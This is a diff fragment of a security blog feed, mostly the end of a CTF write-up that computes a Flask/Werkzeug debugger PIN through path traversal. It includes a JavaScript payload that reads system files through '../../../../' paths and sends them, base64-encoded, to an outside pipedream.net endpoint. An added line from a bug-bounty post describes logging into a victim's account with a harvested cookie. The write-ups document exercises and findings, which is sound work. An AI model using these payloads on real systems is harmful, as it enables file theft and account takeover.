-  <p>uuid.getnode()</p>
-</blockquote>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat</span> /sys/class/net/eth0/address 
-02:42:ac:11:00:04
-root@9d0ff0081967:/app# python3
-Python 3.9.7 <span class="o">(</span>default, Sep  3 2021, 02:02:37<span class="o">)</span> 
-<span class="o">[</span>GCC 10.2.1 20210110] on linux
-Type <span class="s2">"help"</span>, <span class="s2">"copyright"</span>, <span class="s2">"credits"</span> or <span class="s2">"license"</span> <span class="k">for </span>more information.
-<span class="o">&gt;&gt;&gt;</span> <span class="s2">""</span>.join<span class="o">(</span><span class="s2">"02:42:ac:11:00:04"</span>.split<span class="o">(</span><span class="s2">":"</span><span class="o">))</span>
-<span class="s1">'0242ac110004'</span>
-<span class="o">&gt;&gt;&gt;</span> print<span class="o">(</span>0x0242ac110004<span class="o">)</span>
-2485377892356
-
-</code></pre></div></div>
-
-<p>get_machine_id()</p>
-
-<p>Machine Id: /etc/machine-id + /proc/sys/kernel/random/boot_id + /proc/self/cgroup
-With the path traversal we can easily read the values of these files</p>
-
-<p>Here’s the final payload to get all the required info:</p>
-
-<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="dl">""</span>
-<span class="nx">files</span> <span class="o">=</span> <span class="p">[</span><span class="dl">"</span><span class="s2">/sys/class/net/eth0/address</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">/proc/sys/kernel/random/boot_id</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">/proc/self/cgroup</span><span class="dl">"</span><span class="p">]</span>
-
-
-
-
-<span class="c1">// loop through files fetch and send to server</span>
-
-<span class="nx">files</span><span class="p">.</span><span class="nf">forEach</span><span class="p">(</span><span class="nx">file</span> <span class="o">=&gt;</span> <span class="p">{</span>
-    <span class="nf">fetch</span><span class="p">(</span><span class="s2">`/api/ipc_download?file=../../../../</span><span class="p">${</span><span class="nx">file</span><span class="p">}</span><span class="s2">`</span><span class="p">,</span> <span class="p">{</span>
-        <span class="na">credentials</span><span class="p">:</span> <span class="dl">'</span><span class="s1">include</span><span class="dl">'</span>
-    <span class="p">}).</span><span class="nf">then</span><span class="p">(</span><span class="nx">response</span> <span class="o">=&gt;</span> <span class="nx">response</span><span class="p">.</span><span class="nf">text</span><span class="p">())</span>
-        <span class="p">.</span><span class="nf">then</span><span class="p">(</span><span class="nx">data</span> <span class="o">=&gt;</span> <span class="p">{</span>
-            <span class="kd">const</span> <span class="nx">encodedData</span> <span class="o">=</span> <span class="nf">btoa</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
-            <span class="kd">const</span> <span class="nx">url</span> <span class="o">=</span> <span class="s2">`https://en2celr7rewbul.m.pipedream.net/?flag=</span><span class="p">${</span><span class="nx">encodedData</span><span class="p">}</span><span class="s2">`</span><span class="p">;</span>
-            <span class="nf">fetch</span><span class="p">(</span><span class="nx">url</span><span class="p">);</span>
-        <span class="p">});</span>
-<span class="p">});</span>
-</code></pre></div></div>
-
-<p>/sys/class/net/eth0/address</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt;&gt;&gt; "".join("02:42:ac:11:00:02".split(":"))
-'0242ac110002'
-&gt;&gt;&gt; print(0x0242ac110002)
-2485377892354
-</code></pre></div></div>
-
-<p>/proc/sys/kernel/random/boot_id</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>d2ad6c68-ebf1-4090-85ff-60e0b7c2fb86
-</code></pre></div></div>
-
-<p>/proc/self/cgroup</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>12:blkio:/docker/97cb5dd0fb03213072481c8a621847f1a310238d2db0de37ac81c8116a509c3a
-11:cpuset:/docker/97cb5dd0fb03213072481c8a621847f1a310238d2db0de37ac81c8116a509c3a
-10:freezer:/docker/97cb5dd0fb03213072481c8a621847f1a310238d2db0de37ac81c8116a509c3a
-</code></pre></div></div>
-
-<p>machine id =&gt;</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>d2ad6c68-ebf1-4090-85ff-60e0b7c2fb8697cb5dd0fb03213072481c8a621847f1a310238d2db0de37ac81c8116a509c3a
-</code></pre></div></div>
-
-<p>/etc/machine_id can be ignored as this file doesn’t exist on our challenge server.</p>
-
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">probably_public_bits</span> <span class="o">=</span> <span class="p">[</span>
-    <span class="sh">'</span><span class="s">root</span><span class="sh">'</span><span class="p">,</span><span class="c1"># username
-</span>    <span class="sh">'</span><span class="s">flask.app</span><span class="sh">'</span><span class="p">,</span><span class="c1"># modname
-</span>    <span class="sh">'</span><span class="s">Flask</span><span class="sh">'</span><span class="p">,</span><span class="c1"># getattr(app, '__name__', getattr(app.__class__, '__name__'))
-</span>    <span class="sh">'</span><span class="s">/usr/local/lib/python3.11/site-packages/flask/app.py</span><span class="sh">'</span> <span class="c1"># getattr(mod, '__file__', None),
-</span><span class="p">]</span>
-
-<span class="n">private_bits</span> <span class="o">=</span> <span class="p">[</span>
-    <span class="sh">'</span><span class="s">2485377892354</span><span class="sh">'</span><span class="p">,</span><span class="c1"># str(uuid.getnode()),  /sys/class/net/ens33/address 
-</span>    <span class="c1"># Machine Id: /etc/machine-id + /proc/sys/kernel/random/boot_id + /proc/self/cgroup
-</span>    <span class="sh">'</span><span class="s">d2ad6c68-ebf1-4090-85ff-60e0b7c2fb8697cb5dd0fb03213072481c8a621847f1a310238d2db0de37ac81c8116a509c3a</span><span class="sh">'</span>
-<span class="p">]</span>
-</code></pre></div></div>
-
-<p>Now run the script werkzeug-pin-bypass.py and you will have the pin</p>
-
-<p>You can see here that they are indeed same :)
-<img src="https://user-images.githubusercontent.com/31372554/254167983-a0a1401b-cf80-4e17-b17f-94f8f1cb1635.png" alt="image" /></p>
-
-<p>0xbla did all this scripting work in no time so thanks to him we were able to complete this challenge in no time.</p>
-
-<p>And at last we had the flag</p>
-
-<p><img src="https://github.com/Sudistark/CTF-Writeups/assets/31372554/02eb4516-ef05-41ea-b9fc-2e36755ddd85" alt="image" /></p>]]></content><author><name>sudi</name><email>sudi[at]wearehackerone.com</email></author><summary type="html"><![CDATA[Web Desynth Recruit]]></summary></entry></feed>
+<p>So turn on Burp Intercept and load this url in your browser, add this cookie header which has the idcsrf parameter (you can get this from the server logs). Once you do the following now you can succefully logged in to the victim’s account.</p>]]></content><author><name>sudi</name><email>sudi[at]wearehackerone.com</email></author><category term="bug-bounty" /><summary type="html"><![CDATA[My friend @testingforbugs reached to out to me , he had a xss in login.redacted.com and wanted to escalate the xss bug impact, cookies were marked as httponly and the main functionalities of the application were on www.redacted.com so the escalation wasn’t going to be easy here.]]></summary></entry></feed>
